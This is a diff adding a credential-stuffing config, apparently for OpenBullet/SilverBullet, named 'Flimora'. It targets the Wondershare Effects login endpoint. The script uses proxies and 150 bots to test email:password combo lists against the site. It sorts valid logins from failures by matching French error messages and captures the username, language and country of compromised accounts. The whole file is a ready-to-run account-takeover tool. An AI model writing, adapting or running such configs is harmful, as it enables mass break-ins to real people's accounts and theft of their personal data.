@@ -1,0 +1,107 @@
+[SETTINGS]
+{
+  "Name": "Flimora",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-25T09:00:34.4455398+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Flimora",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://effects.wondershare.fr/api/user/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#__hash__ PARSE "<COOKIES(__hash__)>" LR "" "" -> VAR "__hash__" 
+
+#wondershare_session_id PARSE "<COOKIES(wondershare_session_id)>" LR "" "" -> VAR "wondershare_session_id" 
+
+REQUEST POST "https://effects.wondershare.fr/api/user/login" 
+  CONTENT "email=<USER>&password=<PASS>&remember=0&__hash__=<__hash__>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: effects.wondershare.fr" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 131" 
+  HEADER "Origin: https://effects.wondershare.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://effects.wondershare.fr/login.html?from_product=1" 
+  HEADER "Cookie: wondershare_session_id=<wondershare_session_id>" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Il n'y a pas de Wondershare ID" 
+    KEY "Mot de passe incorrec" 
+  KEYCHAIN Success OR 
+    KEY "data\":{\"id\":" 
+
+#Username PARSE "<SOURCE>" LR "username\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#language PARSE "<SOURCE>" LR "language\":\"" "\"" CreateEmpty=FALSE -> CAP "Language" 
+
+#Country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+
